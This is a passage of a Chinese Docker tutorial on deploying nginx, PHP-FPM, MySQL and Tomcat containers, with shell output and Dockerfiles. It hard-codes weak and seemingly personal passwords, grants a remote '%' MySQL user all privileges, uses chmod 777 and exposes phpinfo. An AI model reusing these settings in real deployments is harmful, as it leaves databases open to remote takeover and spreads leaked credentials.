ID，一般可作为日志的文件名。我们可以使用 docker ps 命令查看容器是否有在运行：123[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESc30cd0d51b31 nginx "nginx -g 'daemon of…" 4 seconds ago Up 3 seconds 0.0.0.0:8081-&gt;80/tcp test_docker_nginxPORTS 部分表示端口映射，本地的 8081 端口映射到容器内部的 80 端口。在浏览器中打开 http://127.0.0.1:8081/ , 效果如下：nginx 部署首先，创建目录 nginx, 用于存放后面的相关东西。123456[root@localhost ~]# mkdir -p /home/nginx/www /home/nginx/logs /home/nginx/conf[root@localhost ~]# cd /home/[root@localhost home]# lltotal 4drwxr-xr-x. 6 root root 4096 Jul 12 05:55 flask-gentelella-masterdrwxr-xr-x. 5 root root 41 Jul 12 07:47 nginx拷贝容器内 Nginx 默认配置文件到本地当前目录下的 conf 目录，容器 ID 可以查看 docker ps 命令输入中的第一列：1234[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESc30cd0d51b31 nginx "nginx -g 'daemon of…" 4 seconds ago Up 3 seconds 0.0.0.0:8081-&gt;80/tcp test_docker_nginx[root@localhost home]# docker cp c30cd0d51b31:/etc/nginx/nginx.conf /home/nginx/conf/部署命令12345[root@localhost home]# docker run -d -p 8081:80 --name test_docker_nginx_web -v /home/nginx/www:/usr/share/nginx/html -v /home/nginx/conf/nginx.conf:/etc/nginx/nginx.conf -v /home/nginx/logs:/var/log/nginx nginx9c2fdc3888538ada9d904c0832c39487269185fea3bc9e0179326ccb7753bb98[root@localhost home]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9c2fdc388853 nginx "nginx -g 'daemon of…" 3 seconds ago Up 2 seconds 0.0.0.0:8081-&gt;80/tcp test_docker_nginx_web命令说明：-p 8081:80： 将容器的 80 端口映射到主机的 8081 端口。–name test_docker_nginx_web：将容器命名为test_docker_nginx_web。-v /home/nginx/www:/usr/share/nginx/html：将我们自己创建的 www 目录挂载到容器的 /usr/share/nginx/html。-v /home/nginx/conf/nginx.conf:/etc/nginx/nginx.conf：将我们自己创建的 nginx.conf 挂载到容器的 /etc/nginx/nginx.conf。-v /home/nginx/logs:/var/log/nginx：将我们自己创建的 logs 挂载到容器的 /var/log/nginx。启动以上命令后进入 /home/nginx/www 目录，创建 index.html 文件，内容如下：1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;Docker教程&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;我的第一个标题&lt;/h1&gt; &lt;p&gt;我的第一个段落。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;使用浏览器访问，输出结果如下：相关命令重新载入 NGINX 可以使用以下命令发送 HUP 信号到容器：123# docker kill -s HUP container-name[root@localhost www]# docker kill -s HUP test_docker_nginx_webtest_docker_nginx_web重启 NGINX 容器命令：123# docker restart container-name[root@localhost www]# docker restart test_docker_nginx_webtest_docker_nginx_webDocker 安装 PHP安装 PHP 镜像方法一、docker pull php查找Docker Hub上的php镜像1234567[root@localhost www]# docker search phpNAME DESCRIPTION STARS OFFICIAL AUTOMATEDphp While designed for web development, the PHP … 4607 [OK] phpmyadmin/phpmyadmin A web interface for MySQL and MariaDB. 816 [OK]php-zendserver Zend Server - the integrated PHP application… 168 [OK] webdevops/php-nginx Nginx with PHP-FPM 132 [OK]webdevops/php-apache-dev PHP with Apache for Development (eg. with xd… 105 [OK]拉取官方的镜像,标签为5.6-fpm1234567891011121314[root@localhost ~]# docker pull php:5.6-fpm5.6-fpm: Pulling from library/php5e6ec7f28fb7: Pull complete cf165947b5b7: Pull complete 7bd37682846d: Pull complete 99daf8e838e1: Pull complete f8628c9f032f: Pull complete 50ff925cdfa2: Pull complete 6ab76f312877: Pull complete 28ea94b4dd82: Pull complete a6dbb35d45d2: Pull complete 98b901ec9e8d: Pull complete Digest: sha256:4f070f1b7b93cc5ab364839b79a5b26f38d5f89461f7bc0cd4bab4a3ad7d67d7Status: Downloaded newer image for php:5.6-fpm等待下载完成后，我们就可以在本地镜像列表里查到REPOSITORY为php,标签为5.6-fpm的镜像。123456789101112[root@localhost ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEsandu/python 3.6 3fc000939e8e 2 hours ago 1.05GBsandu/python pro 3fc000939e8e 2 hours ago 1.05GBsandu/ubuntu v2 02c1ed8e875c 3 hours ago 137MBpython 3.6 f93001dcf9ed 11 hours ago 924MBnginx latest f68d6e55e065 10 days ago 109MBubuntu 14.04 2c5e00d77a67 8 weeks ago 188MBcentos latest 9f38484d220f 3 months ago 202MBphp 5.6-fpm 3458979c7744 5 months ago 344MBhello-world latest fce289e99eb9 6 months ago 1.84kBubuntu 15.10 9b9cb95443b5 2 years ago 137MBNginx + PHP 部署启动 PHP：12[root@localhost ~]# docker run --name test_docker_php -v /home/nginx/www/:/www:ro -d php:5.6-fpmdea92165f3271ed8a0651fdd6ef1738f321b462a2cba0cd2eee9e3885a315325命令说明：–name test_docker_php : 将容器命名为test_docker_php。-v /home/nginx/www:/www : 将主机中项目的目录 www 挂载到容器的 /www，ro 表示只读创建 /home/nginx/conf/conf.d 目录：[root@localhost ~]# mkdir -p /home/nginx/conf/conf.d在该目录下添加 /home/nginx/conf/conf.d/test_docker_php.conf 文件，内容如下：123456789101112131415161718192021server &#123; listen 80; server_name localhost; location / &#123; root /usr/share/nginx/html; index index.html index.htm index.php; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125; location ~ \.php$ &#123; fastcgi_pass php:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /www/$fastcgi_script_name; include fastcgi_params; &#125;&#125;配置文件说明：php:9000: 表示 php-fpm 服务的 URL。/www/: 是 test_docker_php中 php 文件的存储路径，映射到本地的 /home/nginx/www 目录。启动 Nginx ：12[root@localhost conf.d]# docker run -d -p 8081:80 --name test_docker_nginx_web -v /home/nginx/www:/usr/share/nginx/html:ro -v /home/nginx/conf/nginx.conf:/etc/nginx/nginx.conf:ro -v /home/nginx/conf/conf.d:/etc/nginx/conf.d:ro -v /home/nginx/logs:/var/log/nginx --link test_docker_php:php nginx4737055f929d939b1201b1c215b011f2673e65e6bc2e769190cfee95ffb1458c命令说明：-p 8081:80: 端口映射，把 nginx 中的 80 映射到本地的 8083 端口。/home/nginx/www: 是本地 html 文件的存储目录，/usr/share/nginx/html 是容器内 html 文件的存储目录。/home/nginx/conf/conf.d: 是本地 nginx 配置文件的存储目录，/etc/nginx/conf.d 是容器内 nginx 配置文件的存储目录。–link test_docker_php:php: 把 test_docker_php 的网络并入 nginx，并通过修改 nginx 的 /etc/hosts，把域名 php 映射成 127.0.0.1，让 nginx 通过 php:9000 访问 php-fpm。接下来我们在 /home/nginx/www 目录下创建 index.php，代码如下：123&lt;?php echo phpinfo();?&gt;浏览器打开 http://ip:8081/index.php ，显示如下：要点总结php容器路径是/www，对应本机的web目录/home/nginx/www/nginx容器web路径是/usr/share/nginx/html，对应本机web目录/home/nginx/www/nginx容器配置文件/etc/nginx/nginx.conf，对应本机/home/nginx/conf/nginx.confnginx容器配置文件/etc/nginx/conf.d路径，对应本机/home/nginx/conf/conf.d路径运行php容器时需要把php容器路径跟本机web路径做映射运行nginx容器时需要把nginx容器相关的路径跟本机路径做映射nginx容器关联有php容易，所以先启动php容器，然后再启动nginx容器，否则会报错：12345678910111213# 先启动php容器，然后再启动nginx容器[root@localhost ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESff21bd0345f4 mysql:5.6 "docker-entrypoint.s…" 2 days ago Exited (255) 30 seconds ago 0.0.0.0:3306-&gt;3306/tcp test_docker_mysql4737055f929d nginx "nginx -g 'daemon of…" 2 days ago Exited (255) 30 seconds ago 0.0.0.0:8081-&gt;80/tcp test_docker_nginx_webb4901afbf62e php:5.6-fpm "docker-php-entrypoi…" 2 days ago Exited (255) 30 seconds ago 9000/tcp test_docker_php[root@localhost ~]# docker start 4737055f929dError response from daemon: Cannot link to a non running container: /test_docker_php AS /test_docker_nginx_web/phpError: failed to start containers: 4737055f929d[root@localhost ~]# docker start b4901afbf62eb4901afbf62e[root@localhost ~]# docker start 4737055f929d4737055f929d相互关系如下图所示：Docker 安装 MySQL安装方法方法一、docker pull mysql查找Docker Hub上的mysql镜像1234567[root@localhost ~]# docker search mysqlNAME DESCRIPTION STARS OFFICIAL AUTOMATEDmysql MySQL is a widely used, open-source relation… 8385 [OK] mariadb MariaDB is a community-developed fork of MyS… 2882 [OK] mysql/mysql-server Optimized MySQL Server Docker images. Create… 624 [OK]percona Percona Server is a fork of the MySQL relati… 438 [OK] centurylink/mysql Image containing mysql. Optimized to be link… 60 [OK]拉取官方的镜像,标签为5.61[root@localhost ~]# docker pull mysql:5.6等待下载完成后，我们就可以在本地镜像列表里查到REPOSITORY为mysql,标签为5.6的镜像。12[root@localhost ~]# docker images | grep mysqlmysql 5.6 3ed1080b793f 4 weeks ago 256MB方法二、通过 Dockerfile构建首先，创建目录mysql,用于存放后面的相关东西。1[root@localhost ~]# mkdir -p ~/mysql/data ~/mysql/logs ~/mysql/conf命令说明：data目录将映射为mysql容器配置的数据文件存放路径logs目录将映射为mysql容器的日志目录conf目录里的配置文件将映射为mysql容器的配置文件进入创建的mysql目录，创建Dockerfile，这个是以Ubuntu系统为参考，CentOS系统使用的话需要修改12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364FROM debian:jessie# add our user and group first to make sure their IDs get assigned consistently, regardless of whatever dependencies get addedRUN groupadd -r mysql &amp;&amp; useradd -r -g mysql mysql# add gosu for easy step-down from rootENV GOSU_VERSION 1.7RUN set -x \ &amp;&amp; apt-get update &amp;&amp; apt-get install -y --no-install-recommends ca-certificates wget &amp;&amp; rm -rf /var/lib/apt/lists/* \ &amp;&amp; wget -O /usr/local/bin/gosu "https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$(dpkg --print-architecture)" \ &amp;&amp; wget -O /usr/local/bin/gosu.asc "https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$(dpkg --print-architecture).asc" \ &amp;&amp; export GNUPGHOME="$(mktemp -d)" \ &amp;&amp; gpg --keyserver ha.pool.sks-keyservers.net --recv-keys B42F6819007F00F88E364FD4036A9C25BF357DD4 \ &amp;&amp; gpg --batch --verify /usr/local/bin/gosu.asc /usr/local/bin/gosu \ &amp;&amp; rm -r "$GNUPGHOME" /usr/local/bin/gosu.asc \ &amp;&amp; chmod +x /usr/local/bin/gosu \ &amp;&amp; gosu nobody true \ &amp;&amp; apt-get purge -y --auto-remove ca-certificates wgetRUN mkdir /docker-entrypoint-initdb.d# FATAL ERROR: please install the following Perl modules before executing /usr/local/mysql/scripts/mysql_install_db:# File::Basename# File::Copy# Sys::Hostname# Data::DumperRUN apt-get update &amp;&amp; apt-get install -y perl pwgen --no-install-recommends &amp;&amp; rm -rf /var/lib/apt/lists/*# gpg: key 5072E1F5: public key "MySQL Release Engineering &lt;mysql-build@oss.oracle.com&gt;" importedRUN apt-key adv --keyserver ha.pool.sks-keyservers.net --recv-keys A4A9406876FCBD3C456770C88C718D3B5072E1F5ENV MYSQL_MAJOR 5.6ENV MYSQL_VERSION 5.6.31-1debian8RUN echo "deb http://repo.mysql.com/apt/debian/ jessie mysql-$&#123;MYSQL_MAJOR&#125;" &gt; /etc/apt/sources.list.d/mysql.list# the "/var/lib/mysql" stuff here is because the mysql-server postinst doesn't have an explicit way to disable the mysql_install_db codepath besides having a database already "configured" (ie, stuff in /var/lib/mysql/mysql)# also, we set debconf keys to make APT a little quieterRUN &#123; \ echo mysql-community-server mysql-community-server/data-dir select ''; \ echo mysql-community-server mysql-community-server/root-pass password ''; \ echo mysql-community-server mysql-community-server/re-root-pass password ''; \ echo mysql-community-server mysql-community-server/remove-test-db select false; \ &#125; | debconf-set-selections \ &amp;&amp; apt-get update &amp;&amp; apt-get install -y mysql-server="$&#123;MYSQL_VERSION&#125;" &amp;&amp; rm -rf /var/lib/apt/lists/* \ &amp;&amp; rm -rf /var/lib/mysql &amp;&amp; mkdir -p /var/lib/mysql /var/run/mysqld \ &amp;&amp; chown -R mysql:mysql /var/lib/mysql /var/run/mysqld \# ensure that /var/run/mysqld (used for socket and lock files) is writable regardless of the UID our mysqld instance ends up having at runtime &amp;&amp; chmod 777 /var/run/mysqld# comment out a few problematic configuration values# don't reverse lookup hostnames, they are usually another containerRUN sed -Ei 's/^(bind-address|log)/#&amp;/' /etc/mysql/my.cnf \ &amp;&amp; echo 'skip-host-cache\nskip-name-resolve' | awk '&#123; print &#125; $1 == "[mysqld]" &amp;&amp; c == 0 &#123; c = 1; system("cat") &#125;' /etc/mysql/my.cnf &gt; /tmp/my.cnf \ &amp;&amp; mv /tmp/my.cnf /etc/mysql/my.cnfVOLUME /var/lib/mysqlCOPY docker-entrypoint.sh /usr/local/bin/RUN ln -s usr/local/bin/docker-entrypoint.sh /entrypoint.sh # backwards compatENTRYPOINT ["docker-entrypoint.sh"]EXPOSE 3306CMD ["mysqld"]通过Dockerfile创建一个镜像，替换成你自己的名字1[root@localhost ~]# docker build -t mysql .创建完成后，我们可以在本地的镜像列表里查找到刚刚创建的镜像12[root@localhost ~]# docker images |grep mysqlmysql 5.6 2c0964ec182a 3 minutes ago 329 MB使用mysql镜像运行容器12345# 如下这个命令是使用本地目录跟MySQL镜像目录想匹配的，使用官方MySQL镜像可以直接使用，若是使用上述自定的的dockfile创建爱你的MySQL镜像，需要把路径换成实际创建时使用的路径[root@localhost home]# mkdir mysql[root@localhost home]# cd mysql[root@localhost mysql]# docker run -p 3306:3306 --name test_docker_mysql -v $PWD/conf:/etc/mysql/conf.d -v $PWD/logs:/logs -v $PWD/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.6ff21bd0345f43b46e148f40ecbcc129683bccfd7fbd5fe9778332e12ffc49ed6命令说明：-p 3306:3306：将容器的 3306 端口映射到主机的 3306 端口。-v -v $PWD/conf:/etc/mysql/conf.d：将主机当前目录下的 conf/my.cnf 挂载到容器的 /etc/mysql/my.cnf。-v $PWD/logs:/logs：将主机当前目录下的 logs 目录挂载到容器的 /logs。-v $PWD/data:/var/lib/mysql ：将主机当前目录下的data目录挂载到容器的 /var/lib/mysql 。-e MYSQL_ROOT_PASSWORD=123456：初始化 root 用户的密码。查看容器启动情况123456789101112131415161718192021222324# 查看当前正在运行的容器，发现没有MySQL容器[root@localhost mysql]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4737055f929d nginx "nginx -g 'daemon of…" 37 minutes ago Up 37 minutes 0.0.0.0:8081-&gt;80/tcp test_docker_nginx_webb4901afbf62e php:5.6-fpm "docker-php-entrypoi…" About an hour ago Up About an hour 9000/tcp test_docker_php# 再次运行MySQL容器，报错，说是容器名已经存在[root@localhost mysql]# docker run -p 3306:3306 --name test_docker_mysql -v $PWD/conf:/etc/mysql/conf.d -v $PWD/logs:/logs -v $PWD/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.6docker: Error response from daemon: Conflict. The container name "/test_docker_mysql" is already in use by container "ff21bd0345f43b46e148f40ecbcc129683bccfd7fbd5fe9778332e12ffc49ed6". You have to remove (or rename) that container to be able to reuse that name.See 'docker run --help'.# 查看所有容器，发现有MySQL容器，状态是Exited[root@localhost mysql]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESff21bd0345f4 mysql:5.6 "docker-entrypoint.s…" 2 minutes ago Exited (1) About a minute ago test_docker_mysql4737055f929d nginx "nginx -g 'daemon of…" 38 minutes ago Up 38 minutes 0.0.0.0:8081-&gt;80/tcp test_docker_nginx_webb4901afbf62e php:5.6-fpm "docker-php-entrypoi…" About an hour ago Up About an hour 9000/tcp test_docker_php# 启动MySQL容器[root@localhost mysql]# docker start ff21bd0345f4ff21bd0345f4# 查看当前正在运行的容器，看到MySQL容器已经运行[root@localhost mysql]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESff21bd0345f4 mysql:5.6 "docker-entrypoint.s…" 3 minutes ago Up 21 seconds 0.0.0.0:3306-&gt;3306/tcp test_docker_mysql4737055f929d nginx "nginx -g 'daemon of…" 38 minutes ago Up 38 minutes 0.0.0.0:8081-&gt;80/tcp test_docker_nginx_webb4901afbf62e php:5.6-fpm "docker-php-entrypoi…" About an hour ago Up About an hour 9000/tcp test_docker_php知识点最新官方MySQL(5.7.19)的docker镜像在创建时映射的配置文件目录有所不同MySQL(5.7.19)的默认配置文件是 /etc/mysql/my.cnf 文件。如果想要自定义配置，建议向 /etc/mysql/conf.d 目录中创建 .cnf 文件。新建的文件可以任意起名，只要保证后缀名是 cnf 即可。新建的文件中的配置项可以覆盖 /etc/mysql/my.cnf 中的配置项。首先需要创建将要映射到容器中的目录以及.cnf文件，然后再创建容器1234567# pwd/opt# mkdir -p docker_v/mysql/conf# cd docker_v/mysql/conf# touch my.cnf# docker run -p 3306:3306 --name mysql -v /opt/docker_v/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=123456 -d imageID4ec4f56455ea2d6d7251a05b7f308e314051fdad2c26bf3d0f27a9b0c0a71414命令说明：-p 3306:3306：将容器的3306端口映射到主机的3306端口-v /opt/docker_v/mysql/conf:/etc/mysql/conf.d：将主机/opt/docker_v/mysql/conf目录挂载到容器的/etc/mysql/conf.d-e MYSQL_ROOT_PASSWORD=123456：初始化root用户的密码-d: 后台运行容器，并返回容器IDimageID: mysql镜像IDdocker 安装 mysql 8 版本12345678910111213141516# docker 中下载 mysqldocker pull mysql#启动docker run --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=Lzslov123! -d mysql#进入容器docker exec -it mysql bash#登录mysqlmysql -u root -pALTER USER 'root'@'localhost' IDENTIFIED BY 'Lzslov123!';#添加远程登录用户CREATE USER 'liaozesong'@'%' IDENTIFIED WITH mysql_native_password BY 'Lzslov123!';GRANT ALL PRIVILEGES ON *.* TO 'liaozesong'@'%';登录docker里的MySQL镜像和远程登录首次使用如下命令启动docker里的MySQL镜像时：1234567891011121314151617181920212223242526272829303132333435363738[root@localhost ~]# cd /home/[root@localhost home]# docker run -p 3306:3306 --name test_docker_mysql -v $PWD/conf:/etc/mysql/conf.d -v $PWD/logs:/logs -v $PWD/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.69d51b883e254d1a946af01c2edc0ed4c5a2155bf5118a5a3fcc8ff6c9053cfc7[root@localhost home]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9d51b883e254 mysql:5.6 "docker-entrypoint.s…" 6 seconds ago Up 5 seconds 0.0.0.0:3306-&gt;3306/tcp test_docker_mysql4737055f929d nginx "nginx -g 'daemon of…" 2 days ago Up 42 minutes 0.0.0.0:8081-&gt;80/tcp test_docker_nginx_webb4901afbf62e php:5.6-fpm "docker-php-entrypoi…" 2 days ago Up 42 minutes 9000/tcp test_docker_php[root@localhost home]# docker exec -it 9d51b883e254 bashroot@9d51b883e254:/# mysql -uroot -pEnter password: # 需要输入初始密码123456Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 1Server version: 5.6.44 MySQL Community Server (GPL)Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema |+--------------------+3 rows in set (0.01 sec)mysql&gt; exit;Byeroot@9d51b883e254:/# exitexit[root@localhost home]#遇到过一个特殊情况，就是关机后再开机，docker服务默认没有开机启动，启动docker服务后，使用命令：docker ps -a命令查看有之前启动过的MySQL镜像，然后启动后使用命令：docker exec -it 容器id bash进去环境，使用命令：mysql -uroot -p，输入密码，总是提示错误：ERROR 1045 (28000): Access denied for user ‘root‘@’localhost’ (using password: YES)。后来的解决办法是在需要输入密码的时候没有输入密码，直接按回车键就登录到MySQL里面来了。后来自己没有关机重启，只是把MySQL镜像服务停了，docker服务停了再按上述步骤操作，不输入密码就登陆不进去，输入密码才能登录进去。记录一下和这个奇葩的情况。远程登录docker里的MySQL镜像，使用Navicat Premium软件，主机名或IP地址一栏填写docker所在服务器的地址，账号密码端口等填写MySQL镜像使用的，就能直接远程登录进来了，不用再做其他配置Docker 安装 Tomcat安装步骤方法一、docker pull tomcat查找Docker Hub上的tomcat镜像123456789[root@localhost ~]# docker search tomcatNAME DESCRIPTION STARS OFFICIAL AUTOMATEDtomcat Apache Tomcat is an open source implementati… 2455 [OK] tomee Apache TomEE is an all-Apache Java EE certif… 66 [OK] dordoka/tomcat Ubuntu 14.04, Oracle JDK 8 and Tomcat 8 base… 53 [OK]bitnami/tomcat Bitnami Tomcat Docker Image 29 [OK]kubeguide/tomcat-app Tomcat image for Chapter 1 26 consol/tomcat-7.0 Tomcat 7.0.57, 8080, "admin/admin" 16 [OK]cloudesire/tomcat Tomcat server, 6/7/8 15 [OK]这里我们拉取官方的镜像1[root@localhost ~]# docker pull tomcat等待下载完成后，我们就可以在本地镜像列表里查到REPOSITORY为tomcat的镜像。12[root@localhost ~]# docker images | grep tomcattomcat latest 89481b5d9082 2 days ago 506MB方法二、通过 Dockerfile 构建首先，创建目录tomcat,用于存放后面的相关东西。1[root@localhost ~]# mkdir -p ~/tomcat/webapps ~/tomcat/logs ~/tomcat/conf命令说明：webapps目录将映射为tomcat容器配置的应用程序目录logs目录将映射为tomcat容器的日志目录conf目录里的配置文件将映射为tomcat容器的配置文件进入创建的tomcat目录，创建Dockerfile，这个是以Ubuntu系统为参考，CentOS系统使用的话需要修改123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161FROM openjdk:8-jreENV CATALINA_HOME /usr/local/tomcatENV PATH $CATALINA_HOME/bin:$PATHRUN mkdir -p &quot;$CATALINA_HOME&quot;WORKDIR $CATALINA_HOME# let &quot;Tomcat Native&quot; live somewhere isolatedENV TOMCAT_NATIVE_LIBDIR $CATALINA_HOME/native-jni-libENV LD_LIBRARY_PATH $&#123;LD_LIBRARY_PATH:+$LD_LIBRARY_PATH:&#125;$TOMCAT_NATIVE_LIBDIR# runtime dependencies for Tomcat Native Libraries# Tomcat Native 1.2+ requires a newer version of OpenSSL than debian:jessie has available# &gt; checking OpenSSL library version &gt;= 1.0.2...# &gt; configure: error: Your version of OpenSSL is not compatible with this version of tcnative# see http://tomcat.10.x6.nabble.com/VOTE-Release-Apache-Tomcat-8-0-32-tp5046007p5046024.html (and following discussion)# and https://github.com/docker-library/tomcat/pull/31ENV OPENSSL_VERSION 1.1.0f-3+deb9u2RUN set -ex; \ currentVersion=&quot;$(dpkg-query --show --showformat &apos;$&#123;Version&#125;\n&apos; openssl)&quot;; \ if dpkg --compare-versions &quot;$currentVersion&quot; &apos;&lt;&lt;&apos; &quot;$OPENSSL_VERSION&quot;; then \ if ! grep -q stretch /etc/apt/sources.list; then \# only add stretch if we&apos;re not already building from within stretch &#123; \ echo &apos;deb http://deb.debian.org/debian stretch main&apos;; \ echo &apos;deb http://security.debian.org stretch/updates main&apos;; \ echo &apos;deb http://deb.debian.org/debian stretch-updates main&apos;; \ &#125; &gt; /etc/apt/sources.list.d/stretch.list; \ &#123; \# add a negative &quot;Pin-Priority&quot; so that we never ever get packages from stretch unless we explicitly request them echo &apos;Package: *&apos;; \ echo &apos;Pin: release n=stretch*&apos;; \ echo &apos;Pin-Priority: -10&apos;; \ echo; \# ... except OpenSSL, which is the reason we&apos;re here echo &apos;Package: openssl libssl*&apos;; \ echo &quot;Pin: version $OPENSSL_VERSION&quot;; \ echo &apos;Pin-Priority: 990&apos;; \ &#125; &gt; /etc/apt/preferences.d/stretch-openssl; \ fi; \ apt-get update; \ apt-get install -y --no-install-recommends openssl=&quot;$OPENSSL_VERSION&quot;; \ rm -rf /var/lib/apt/lists/*; \ fiRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \ libapr1 \ &amp;&amp; rm -rf /var/lib/apt/lists/*# see https://www.apache.org/dist/tomcat/tomcat-$TOMCAT_MAJOR/KEYS# see also &quot;update.sh&quot; (https://github.com/docker-library/tomcat/blob/master/update.sh)ENV GPG_KEYS 05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 713DA88BE50911535FE716F5208B0AB1D63011C7 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23ENV TOMCAT_MAJOR 8ENV TOMCAT_VERSION 8.5.32ENV TOMCAT_SHA512 fc010f4643cb9996cad3812594190564d0a30be717f659110211414faf8063c61fad1f18134154084ad3ddfbbbdb352fa6686a28fbb6402d3207d4e0a88fa9ceENV TOMCAT_TGZ_URLS \# https://issues.apache.org/jira/browse/INFRA-8753?focusedCommentId=14735394#comment-14735394 https://www.apache.org/dyn/closer.cgi?action=download&amp;filename=tomcat/tomcat-$TOMCAT_MAJOR/v$TOMCAT_VERSION/bin/apache-tomcat-$TOMCAT_VERSION.tar.gz \# if the version is outdated, we might have to pull from the dist/archive :/ https://www-us.apache.org/dist/tomcat/tomcat-$TOMCAT_MAJOR/v$TOMCAT_VERSION/bin/apache-tomcat-$TOMCAT_VERSION.tar.gz \ https://www.apache.org/dist/tomcat/tomcat-$TOMCAT_MAJOR/v$TOMCAT_VERSION/bin/apache-tomcat-$TOMCAT_VERSION.tar.gz \ https://archive.apache.org/dist/tomcat/tomcat-$TOMCAT_MAJOR/v$TOMCAT_VERSION/bin/apache-tomcat-$TOMCAT_VERSION.tar.gzENV TOMCAT_ASC_URLS \ https://www.apache.org/dyn/closer.cgi?action=download&amp;filename=tomcat/tomcat-$TOMCAT_MAJOR/v$TOMCAT_VERSION/bin/apache-tomcat-$TOMCAT_VERSION.tar.gz.asc \# not all the mirrors actually carry the .asc files :&apos;( https://www-us.apache.org/dist/tomcat/tomcat-$TOMCAT_MAJOR/v$TOMCAT_VERSION/bin/apache-tomcat-$TOMCAT_VERSION.tar.gz.asc \ https://www.apache.org/dist/tomcat/tomcat-$TOMCAT_MAJOR/v$TOMCAT_VERSION/bin/apache-tomcat-$TOMCAT_VERSION.tar.gz.asc \ https://archive.apache.org/dist/tomcat/tomcat-$TOMCAT_MAJOR/v$TOMCAT_VERSION/bin/apache-tomcat-$TOMCAT_VERSION.tar.gz.ascRUN set -eux; \ \ savedAptMark=&quot;$(apt-mark showmanual)&quot;; \ apt-get update; \ \ apt-get install -y --no-install-recommends gnupg dirmngr; \ \ export GNUPGHOME=&quot;$(mktemp -d)&quot;; \ for key in $GPG_KEYS; do \ gpg --keyserver ha.pool.sks-keyservers.net --recv-keys &quot;$key&quot;; \ done; \ \ apt-get install -y --no-install-recommends wget ca-certificates; \ \ success=; \ for url in $TOMCAT_TGZ_URLS; do \ if wget -O tomcat.tar.gz &quot;$url&quot;; then \ success=1; \ break; \ fi; \ done; \ [ -n &quot;$success&quot; ]; \ \ echo &quot;$TOMCAT_SHA512 *tomcat.tar.gz&quot; | sha512sum -c -; \ \ success=; \ for url in $TOMCAT_ASC_URLS; do \ if wget -O tomcat.tar.gz.asc &quot;$url&quot;; then \ success=1; \ break; \ fi; \ done; \ [ -n &quot;$success&quot; ]; \ \ gpg --batch --verify tomcat.tar.gz.asc tomcat.tar.gz; \ tar -xvf tomcat.tar.gz --strip-components=1; \ rm bin/*.bat; \ rm tomcat.tar.gz*; \ rm -rf &quot;$GNUPGHOME&quot;; \ \ nativeBuildDir=&quot;$(mktemp -d)&quot;; \ tar -xvf bin/tomcat-native.tar.gz -C &quot;$nativeBuildDir&quot; --strip-components=1; \ apt-get install -y --no-install-recommends \ dpkg-dev \ gcc \ libapr1-dev \ libssl-dev \ make \ &quot;openjdk-$&#123;JAVA_VERSION%%[.~bu-]*&#125;-jdk=$JAVA_DEBIAN_VERSION&quot; \ ; \ ( \ export CATALINA_HOME=&quot;$PWD&quot;; \ cd &quot;$nativeBuildDir/native&quot;; \ gnuArch=&quot;$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)&quot;; \ ./configure \ --build=&quot;$gnuArch&quot; \ --libdir=&quot;$TOMCAT_NATIVE_LIBDIR&quot; \ --prefix=&quot;$CATALINA_HOME&quot; \ --with-apr=&quot;$(which apr-1-config)&quot; \ --with-java-home=&quot;$(docker-java-home)&quot; \ --with-ssl=yes; \ make -j &quot;$(nproc)&quot;; \ make install; \ ); \ rm -rf &quot;$nativeBuildDir&quot;; \ rm bin/tomcat-native.tar.gz; \ \# reset apt-mark&apos;s &quot;manual&quot; list so that &quot;purge --auto-remove&quot; will remove all build dependencies apt-mark auto &apos;.*&apos; &gt; /dev/null; \ [ -z &quot;$savedAptMark&quot; ] || apt-mark manual $savedAptMark; \ apt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false; \ rm -rf /var/lib/apt/lists/*; \ 